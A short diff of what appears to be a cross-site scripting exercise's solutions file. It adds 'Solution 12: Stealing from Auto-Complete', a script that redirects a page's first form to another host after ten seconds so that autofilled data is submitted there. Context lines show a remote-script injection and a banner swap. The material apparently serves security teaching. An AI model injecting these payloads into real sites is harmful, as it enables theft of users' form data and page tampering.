@@ -125,10 +125,26 @@ newtag.src = "http://demofilespa.s3.amazonaws.com/jfptest.js";
 document.body.appendChild(newtag);
 
 
-* Solution 11: 
+* Solution 11: Replace Banner
 
 <script>
 	
 document.getElementsByTagName("img")[0].src = "https://pluralsight2.imgix.net/paths/images/javascript-542e10ea6e.png"
 
 </script>
+
+
+* Solution 12: Stealing from Auto-Complete
+
+<script>
+	
+window.setTimeout( function() 
+
+{
+	document.forms[0].action = 'http://localhost';
+	document.forms[0].submit();
+
+}, 10000 );
+	
+</script>
+
